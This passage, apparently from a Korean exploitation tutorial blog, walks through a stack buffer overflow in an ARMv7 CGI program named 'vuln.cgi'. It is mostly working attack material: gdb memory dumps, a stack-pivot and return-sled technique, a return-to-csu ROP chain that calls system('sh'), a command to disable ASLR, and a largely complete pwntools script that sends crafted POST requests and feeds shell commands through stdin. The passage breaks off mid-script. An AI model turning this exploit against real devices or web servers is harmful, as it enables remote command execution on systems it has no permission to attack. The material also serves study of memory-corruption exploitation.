    <span class="n">param</span>   <span class="o">=</span> <span class="n">form_param</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">spray</span><span class="p">)</span>
    <span class="n">packet</span>  <span class="o">=</span> <span class="n">form_packet</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">param</span><span class="p">)</span>
<span class="c1"># ...
</span></code></pre></div></div>

<p>4바이트의 null을 삽입 해 봅니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) x/16wx $sp+0x380
0xbed44db8:     0x61616161      0x61616161      0x61616161      0x61616161
0xbed44dc8:     0x64646161      0x44446464      0x73004444      0x0000003d
0xbed44dd8:     0x62626200      0x62626262      0x62626262      0x62626262
0xbed44de8:     0x62626262      0x62626262      0x62626262      0x62626262
(gdb) x/16wx $sp+0x380+0x10000
0xbed54db8:     0x62626262      0x62626262      0x62626262      0x62626262
0xbed54dc8:     0x62626262      0x62620062      0x62626262      0x45520062
0xbed54dd8:     0x53455551      0x52555f54      0x762f3d49      0x2e6e6c75
0xbed54de8:     0x3f696763      0x6f636669      0x6769666e      0x6326793d
(gdb)
</code></pre></div></div>

<p>Null-byte를 삽입할 수 있는 영역임을 확인 했습니다.</p>

<h3 id="stack-pointer-변조">Stack Pointer 변조</h3>

<p>armv7에서 <code class="language-plaintext highlighter-rouge">R11</code> 레지스터는 x86의 <code class="language-plaintext highlighter-rouge">ebp</code>와 같은 역할을 수행합니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) disas main
...
   0x00010c9c &lt;+624&gt;:   mov     r0, r3      // -- main epilogue --
   0x00010ca0 &lt;+628&gt;:   sub     sp, r11, #4 // r11(bp)에서 4를 뺀 값을 sp에 저장합니다.
   0x00010ca4 &lt;+632&gt;:   pop     {r11, pc}   // 스택에서 r11, pc를 순차적으로 pop합니다.
...
</code></pre></div></div>

<p>이를 활용하면 Stack pointer(<code class="language-plaintext highlighter-rouge">sp</code>)를 변조할 수 있습니다.</p>

<p>아래와 같은 순서의 명령을 수행한다고 가정합니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>### Stage 1 ######################################################
+-Code-------------+---------------------------------------------+
| pc  &gt; 0x00010ca0 | sub  sp, r11, #4                            |
|       0x00010ca4 | pop  {r11, pc}                              |
+------------------+---------------------------------------------+
+-Stack------------+----------0----------4----------8----------c-+
|       0xbfff8f00 | 0x00000000 0x00000000 0x00000000 0x00000000 |
|       0xbfff8f10 | 0xbfff8f24 0x00010ca0 0x00000000 0x00000000 |
|       0xbfff8f20 | 0x41414141 0x41414141 0x41414141 0x41414141 |
+------------------+---------------------------------------------+
+-Register-------------------------------------------------------+
| sp    0xbfff8f00                                               |
| r11   0xbfff8f14                                               |
+----------------------------------------------------------------+

### Stage 2 ######################################################
+-Code-------------+---------------------------------------------+
|       0x00010ca0 | sub  sp, r11, #4                            |
| pc  &gt; 0x00010ca4 | pop  {r11, pc}                              |
+------------------+---------------------------------------------+
+-Stack------------+----------0----------4----------8----------c-+
|       0xbfff8f00 | 0x00000000 0x00000000 0x00000000 0x00000000 |
|       0xbfff8f10 | 0xbfff8f24 0x00010ca0 0x00000000 0x00000000 |
|       0xbfff8f20 | 0x41414141 0x41414141 0x41414141 0x41414141 |
+------------------+---------------------------------------------+
+-Register-------------------------------------------------------+
| sp    0xbfff8f10 *                                             |
| r11   0xbfff8f14                                               |
+----------------------------------------------------------------+
* r11에서 4를 뺀 값을 sp에 넣었습니다.

### Stage 3 ######################################################
+-Code-------------+---------------------------------------------+
| pc  &gt; 0x00010ca0 | sub  sp, r11, #4                            |
|       0x00010ca4 | pop  {r11, pc}                              |
+------------------+---------------------------------------------+
+-Stack------------+----------0----------4----------8----------c-+
|       0xbfff8f00 | 0x00000000 0x00000000 0x00000000 0x00000000 |
|       0xbfff8f10 | 0xbfff8f24 0x00010ca0 0x00000000 0x00000000 |
|       0xbfff8f20 | 0x41414141 0x41414141 0x41414141 0x41414141 |
+------------------+---------------------------------------------+
+-Register-------------------------------------------------------+
| sp    0xbfff8f10                                               |
| r11   0xbfff8f24 *                                             |
+----------------------------------------------------------------+
* sp(0xbfff8f10)에서 r11, pc를 pop 했습니다.

### Stage 4 ######################################################
+-Code-------------+---------------------------------------------+
|       0x00010ca0 | sub  sp, r11, #4                            |
| pc  &gt; 0x00010ca4 | pop  {r11, pc}                              |
+------------------+---------------------------------------------+
+-Stack------------+----------0----------4----------8----------c-+
|       0xbfff8f00 | 0x00000000 0x00000000 0x00000000 0x00000000 |
|       0xbfff8f10 | 0xbfff8f24 0x00010ca0 0x00000000 0x00000000 |
|       0xbfff8f20 | 0x41414141 0x41414141 0x41414141 0x41414141 |
+------------------+---------------------------------------------+
+-Register-------------------------------------------------------+
| sp    0xbfff8f20 *                                             |
| r11   0xbfff8f24                                               |
+----------------------------------------------------------------+
* r11에서 4를 뺀 값을 sp에 넣었습니다.
  sp의 값이 우리가 원하는 값(0xbfff8f20)으로 변조되었습니다.
  
### Stage 5 ######################################################
+-Code-------------+---------------------------------------------+
| pc  &gt; 0x41414141 | ........................................... |
+------------------+---------------------------------------------+
+-Stack------------+----------0----------4----------8----------c-+
|       0xbfff8f00 | 0x00000000 0x00000000 0x00000000 0x00000000 |
|       0xbfff8f10 | 0xbfff8f24 0x00010ca0 0x00000000 0x00000000 |
|       0xbfff8f20 | 0x41414141 0x41414141 0x41414141 0x41414141 |
+------------------+---------------------------------------------+
+-Register-------------------------------------------------------+
| sp    0xbfff8f28                                               |
| r11   0x41414141                                               |
+----------------------------------------------------------------+
* pc와 r11이 변조되었습니다.
</code></pre></div></div>

<p>위와 같은 방법으로 연속적인 함수의 호출 또는 인자의 구성을 위해 <code class="language-plaintext highlighter-rouge">SP</code>를 변조할 수 있습니다.</p>

<h3 id="공격코드-작성">공격코드 작성</h3>

<p>위 두가지 방법을 이용하면 다음과 같은 흐름으로 공격을 수행합니다.</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">QUERY_STRING</code>을 전달함으로 BOF를 발생시키고, 스택에 ROP Payload를 spray합니다.</li>
  <li><code class="language-plaintext highlighter-rouge">SP</code>를 Stack spray된 영역으로 변조합니다.</li>
  <li>ROP Payload를 수행합니다.
    <ol>
      <li>ASLR이 비활성화 되어있으면, ROP Payload를 즉각적으로 수행 할 수 있습니다.</li>
      <li>ASLR이 활성화 되어있으면, <code class="language-plaintext highlighter-rouge">SP</code>가 잘못된 영역을 역참조 할 수 있습니다. 이럴경우, 1을 다시 수행합니다.</li>
    </ol>
  </li>
</ol>

<h4 id="case-aslr-비활성화">Case: ASLR 비활성화</h4>

<p>다음과 같이 ASLR을 비활성화 할 수 있습니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># echo 0 &gt; /proc/sys/kernel/randomize_va_space
# cat /proc/sys/kernel/randomize_va_space
0
</code></pre></div></div>

<p>ASLR이 비활성화 된 후, 스프레이를 먼저 수행하여 core dump를 확인합니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) x/32wx $sp+0x380
0xbefe1d98:     0x6161616b      0x6161616c      0x6161616d      0x6161616e
0xbefe1da8:     0xbefe1ddc      0x44444444      0x3d737300      0x41414141
0xbefe1db8:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefe1dc8:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefe1dd8:     0x41414141      0x41414141      0x41414141      0x41414141
</code></pre></div></div>

<p>Stack spray가 <code class="language-plaintext highlighter-rouge">0xbefe1db4</code>에서 시작합니다. 해당 주소로 <code class="language-plaintext highlighter-rouge">sp</code>를 변조합니다.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">SPRAY_LEN</span> <span class="o">=</span> <span class="mh">0xf000</span>
<span class="n">leave</span>  <span class="o">=</span> <span class="mh">0x00010ca0</span> <span class="c1"># sub sp, r11, 4; pop {r11, pc}
</span>
<span class="k">def</span> <span class="nf">payload</span><span class="p">(</span><span class="n">r11</span><span class="p">,</span> <span class="n">lr</span><span class="p">,</span> <span class="n">dummy_len</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="n">dummy_len</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">r11</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">lr</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">payload</span>

<span class="k">def</span> <span class="nf">spray</span><span class="p">():</span>
    <span class="n">spray</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="n">SPRAY_LEN</span>
    <span class="k">return</span> <span class="n">spray</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
<span class="c1"># ...
</span>    <span class="n">stack</span>  <span class="o">=</span> <span class="mh">0xbefe1db4</span><span class="o">+</span><span class="mi">4</span>
    <span class="n">pload</span>  <span class="o">=</span> <span class="n">payload</span><span class="p">(</span><span class="n">stack</span><span class="p">,</span> <span class="n">leave</span><span class="p">,</span> <span class="n">dummy_len</span><span class="p">)</span>
    <span class="n">param</span>  <span class="o">=</span> <span class="n">form_param</span><span class="p">(</span><span class="n">pload</span><span class="p">,</span> <span class="n">spray</span><span class="p">())</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="n">form_packet</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">param</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span>
<span class="c1"># ...
</span></code></pre></div></div>

<p>위의 코드를 실행 후 다시 <code class="language-plaintext highlighter-rouge">gdb</code>로 확인합니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) x/16wx $sp-0x10
0xbefe1dac:     0x00010ca0      0x3d737300      0x41414141      0x41414141
0xbefe1dbc:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefe1dcc:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefe1ddc:     0x41414141      0x41414141      0x41414141      0x41414141
(gdb) i r pc
pc             0x41414140       0x41414140
(gdb)
</code></pre></div></div>

<p>정상적으로 <code class="language-plaintext highlighter-rouge">pc</code>가 변조되었습니다.</p>

<h4 id="return-sled">Return sled</h4>

<p>Return sled를 이용하여 스프레이한 영역의 어느곳으로 <code class="language-plaintext highlighter-rouge">sp</code>, <code class="language-plaintext highlighter-rouge">pc</code>가 변조되어도 공격자의 ROP Payload가 실행되도록 합니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x00010ca4: pop {r11, pc}
0x000108e0: pop {r4, r11, pc}
</code></pre></div></div>

<p>위의 두 가젯을 활용합니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      ...
|  0x00010ca4
|  0x00010ca4
|  0x000108e0
|  0x00010ca4 # r4
|  0x41414141 # r11
V  [ROP HERE] # pc
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">spray</span><span class="p">():</span>
    <span class="c1"># ...
</span>	<span class="n">spray</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">sled_1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(((</span><span class="n">SPRAY_LEN</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="p">))</span> <span class="o">//</span> <span class="n">EADDR_LEN</span><span class="p">)</span><span class="o">-</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">spray</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">sled_2</span><span class="p">)</span> <span class="o">+</span> <span class="n">purl32</span><span class="p">(</span><span class="n">sled_1</span><span class="p">)</span> <span class="o">+</span> <span class="s">"AAAA"</span>
    <span class="n">spray</span> <span class="o">+=</span> <span class="n">rop</span>
    
    <span class="k">return</span> <span class="n">spray</span>
</code></pre></div></div>

<h4 id="rop">ROP</h4>

<p>Return-to-csu를 활용합니다.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">chain</span><span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">r0</span><span class="p">,</span> <span class="n">r1</span><span class="p">,</span> <span class="n">r2</span><span class="p">):</span>
    <span class="n">c</span> <span class="o">=</span> <span class="s">''</span>
    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="mh">0x00000000</span><span class="p">)</span> <span class="c1"># r4
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">func</span><span class="p">)</span>       <span class="c1"># [r5] =&gt; r3
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="mh">0x00000000</span><span class="p">)</span> <span class="c1"># r6
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">r0</span><span class="p">)</span>         <span class="c1"># r7 =&gt; r0
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">r1</span><span class="p">)</span>         <span class="c1"># r8 =&gt; r1
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">r2</span><span class="p">)</span>         <span class="c1"># r9 =&gt; r2
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="mh">0x00000000</span><span class="p">)</span> <span class="c1"># r10
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">csu_2</span><span class="p">)</span>      <span class="c1"># pc
</span>    <span class="k">return</span> <span class="n">c</span>

<span class="k">def</span> <span class="nf">spray</span><span class="p">():</span>
    <span class="c1">#...
</span>	<span class="c1"># Return-to-csu.
</span>    <span class="n">rop</span> <span class="o">=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">csu_1</span><span class="p">)</span>

    <span class="c1"># Set bss:0x20 to get_val address.
</span>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
        <span class="n">addr</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x20</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
        <span class="n">value</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'get_val'</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
        <span class="n">rop</span> <span class="o">+=</span> <span class="n">chain</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'memset'</span><span class="p">],</span> <span class="n">addr</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>

    <span class="c1"># get_val("t", bss:0x24, 2): returns "sh"
</span>    <span class="n">rop</span> <span class="o">+=</span> <span class="n">chain</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x20</span><span class="p">),</span> <span class="n">str_t</span><span class="p">,</span> <span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x24</span><span class="p">),</span> <span class="mi">2</span><span class="p">)</span> <span class="c1"># get_val
</span>    <span class="n">rop</span> <span class="o">+=</span> <span class="n">chain</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'system'</span><span class="p">],</span> <span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x24</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="c1">#...
</span></code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">chain()</code> 함수는 Return-to-csu 가젯을 자동으로 구성 해 줍니다.</li>
  <li><code class="language-plaintext highlighter-rouge">L18~22</code> : <code class="language-plaintext highlighter-rouge">bss:0x20</code> 지점에 <code class="language-plaintext highlighter-rouge">get_val</code> 함수의 포인터를 작성합니다.</li>
  <li><code class="language-plaintext highlighter-rouge">L25</code> : <code class="language-plaintext highlighter-rouge">get_val</code> 함수를 이용해 <code class="language-plaintext highlighter-rouge">QUERY_STRING</code>에서 <code class="language-plaintext highlighter-rouge">t</code> 쿼리의 값을 <code class="language-plaintext highlighter-rouge">bss:0x24</code> 지점에 작성합니다. 그 값은 <code class="language-plaintext highlighter-rouge">"sh"</code> 입니다.</li>
  <li><code class="language-plaintext highlighter-rouge">L26</code> : <code class="language-plaintext highlighter-rouge">system</code> 함수를 이용해 쉘을 실행시킵니다.</li>
</ul>

<h4 id="명령어-전달">명령어 전달</h4>

<p>ROP Payload가 수행되고 나면, 쉘 프로세스가 실행되고, 명령어 입력까지 대기합니다.</p>

<p><code class="language-plaintext highlighter-rouge">POST</code> 메소드를 이용해 Standard input으로 쉘 명령을 전달하여 실행시킵니다.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">form_packet</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">param</span><span class="p">,</span> <span class="n">content</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
    <span class="n">packet</span>  <span class="o">=</span> <span class="s">""</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"POST http://{}/vuln.cgi?{} HTTP/1.1</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">param</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Host: {}</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Connection: keep-alive</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Content-Length: {}</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">))</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"User-Agent: Mozilla/5.0</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Accept: */*</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Origin: http://{}</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Referer: http://{}/home.cgi</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Accept-Encoding: gzip, deflate</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="n">content</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="k">return</span> <span class="n">packet</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
</code></pre></div></div>

<h4 id="안정화-작업">안정화 작업</h4>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>

    <span class="c1"># ifconfig's output length is not fixed.
</span>    <span class="c1"># So, we need to get the buffer first to calculate
</span>    <span class="c1"># the overflow size.
</span>    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Getting buffer."</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="n">form_packet</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">form_param</span><span class="p">())</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">().</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">r</span><span class="p">[</span><span class="n">r</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"- ifconfig"</span><span class="p">):</span><span class="n">r</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n\n</span><span class="s">"</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span>
    <span class="n">dummy_len</span> <span class="o">=</span> <span class="mh">0x204</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Exploit."</span><span class="p">)</span>
    <span class="n">stack</span>  <span class="o">=</span> <span class="mh">0xbefe1db4</span><span class="o">+</span><span class="mi">4</span>
    <span class="n">pload</span>  <span class="o">=</span> <span class="n">payload</span><span class="p">(</span><span class="n">stack</span><span class="p">,</span> <span class="n">leave</span><span class="p">,</span> <span class="n">dummy_len</span><span class="p">)</span>
    <span class="n">param</span>  <span class="o">=</span> <span class="n">form_param</span><span class="p">(</span><span class="n">pload</span><span class="p">,</span> <span class="n">spray</span><span class="p">())</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="n">form_packet</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">param</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Success!"</span><span class="p">)</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">ifconfig</code> 명령의 출력값의 길이가 고정되어있지 않습니다.</p>

<p>오버플로우 사이즈를 안정적으로 계산하기 위해 <code class="language-plaintext highlighter-rouge">ifconfig</code> 명령 결과 버퍼의 길이값을 측정하고, 계산합니다.</p>

<h4 id="no-aslr-공격-코드">no-ASLR 공격 코드</h4>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./vuln"</span><span class="p">)</span>

<span class="c1"># Globals &amp; Defines
</span><span class="n">spray_fix</span> <span class="o">=</span> <span class="s">''</span>
<span class="n">SPRAY_LEN</span> <span class="o">=</span> <span class="mh">0xf000</span>
<span class="n">EADDR_LEN</span> <span class="o">=</span> <span class="mi">12</span>

<span class="c1"># Gadgets
</span><span class="n">sled_1</span> <span class="o">=</span> <span class="mh">0x00010ca4</span> <span class="c1"># pop {r11, pc}
</span><span class="n">sled_2</span> <span class="o">=</span> <span class="mh">0x000108e0</span> <span class="c1"># pop {r4, r11, pc}
</span><span class="n">csu_1</span>  <span class="o">=</span> <span class="mh">0x00010d28</span>
<span class="n">csu_2</span>  <span class="o">=</span> <span class="mh">0x00010d0c</span>
<span class="n">leave</span>  <span class="o">=</span> <span class="mh">0x00010ca0</span> <span class="c1"># sub sp, r11, 4; pop {r11, pc}
</span>
<span class="c1"># ETC.
</span><span class="n">str_t</span> <span class="o">=</span> <span class="mh">0x10e66</span>

<span class="k">def</span> <span class="nf">purl32</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
    <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0x000000ff</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">0</span>
    <span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0x0000ff00</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>
    <span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0x00ff0000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span>
    <span class="n">d</span> <span class="o">=</span> <span class="p">(</span><span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xff000000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span>
    <span class="k">return</span> <span class="s">"%{:02x}%{:02x}%{:02x}%{:02x}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">form_packet</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">param</span><span class="p">,</span> <span class="n">content</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
    <span class="n">packet</span>  <span class="o">=</span> <span class="s">""</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"POST http://{}/vuln.cgi?{} HTTP/1.1</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">param</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Host: {}</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Connection: keep-alive</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Content-Length: {}</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">))</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"User-Agent: Mozilla/5.0</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Accept: */*</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Origin: http://{}</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Referer: http://{}/home.cgi</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Accept-Encoding: gzip, deflate</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="n">content</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="k">return</span> <span class="n">packet</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">form_param</span><span class="p">(</span><span class="n">payload</span><span class="o">=</span><span class="s">''</span><span class="p">,</span> <span class="n">spray</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
    <span class="n">p</span> <span class="o">=</span> <span class="p">[</span><span class="s">"t=sh"</span><span class="p">,</span> <span class="s">"ifconfig=y"</span><span class="p">]</span>
    <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
        <span class="n">p</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">"comment="</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">spray</span><span class="p">:</span>
        <span class="n">p</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">"ss="</span><span class="o">+</span><span class="n">spray</span><span class="p">)</span>
    <span class="k">return</span> <span class="s">"&amp;"</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>

